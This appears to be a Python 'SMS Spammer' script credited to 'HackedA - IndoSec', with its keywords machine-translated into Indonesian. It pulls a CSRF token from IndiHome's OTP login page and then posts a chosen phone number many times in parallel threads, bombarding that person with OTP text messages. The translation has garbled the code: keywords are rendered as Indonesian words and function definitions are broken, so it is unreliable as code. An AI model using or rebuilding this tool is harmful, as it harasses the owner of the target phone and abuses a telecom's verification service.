permintaan impor , sys , re
dari  bersamaan . impor berjangka  ThreadPoolExecutor 
 
 
 gas def ( tidak ada ):
	s  =  permintaan . Sesi ()
	url  =  "https://www.indihome.co.id/verifikasi-layanan/login-otp"
	permintaan  =  s . dapatkan ( url ). teks
	tanda  =  re . findall ( r"name=\"_token\" value=\"(.*?)\"" , req )[ 0 ]
		
	data  = {
	"_token" : token ,
	"msisdn" : tidak
	}

	spam  =  s . posting ( url , data = data ). teks

	kembalikan  spam

def  main ( cnt , tidak ):
	jml  =  0
	dengan  ThreadPoolExecutor ( max_workers = 2 ) sebagai  e :
		masa depan  = []
		untuk  x  dalam  rentang ( int ( cnt )):
			berjangka . tambahkan ( e . submit ( gas , no ))
		untuk  i , masa depan  di  enumerate ( futures ):
			jml  +=  1
			spam  =  masa depan . hasil ()
			jika  "Gagal!"  atau  "dikirim"  di  spam :
				print ( f"[ { jml } ] Spam { tidak } " )
			lain :
				print ( "*KESALAHAN*" )
				sys . keluar ()
	cetak ( "" )
 
if  __name__  ==  '__main__' :
	coba :
		cetak ( """ \033 [1m
   _____ __ ________
  / ___// |/ / ___/ | SMS Spammer
  \__ \/ /|_/ /\__ \ | Spammer SMS ciptaan HackedA
___/ / / / /___/ / | Dikodekan oleh HackedA - \033 [31;2mIndo \033 [39;2mSec \033 [0;1m]
/____/_/ /_//____/ | mis: 08xxxxx77 \033 [0m
	""" )

		tidak  =  masukan ( "Tidak : " )
		jika ( tidak ada . isdigit ()):
			lulus
		lain :
			print ( "Periksa nomor telepon Anda!" )
			sys . keluar ()

		jika  len ( tidak ) <  9 :
			print ( "Periksa nomor telepon Anda!" )
			sys . keluar ()

		cnt  =  input ( "Jumlah : " )

		if  bool ( cnt . isdigit ()) ==  0 :
			print ( "Periksa jumlahmu!" )
			sys . keluar ()
		lain :
			cetak ( "" )
			utama ( cnt , tidak )
	kecuali ( KeyboardInterrupt , EOFError ):
		cetak ( " \n " )
		sys . keluar ()
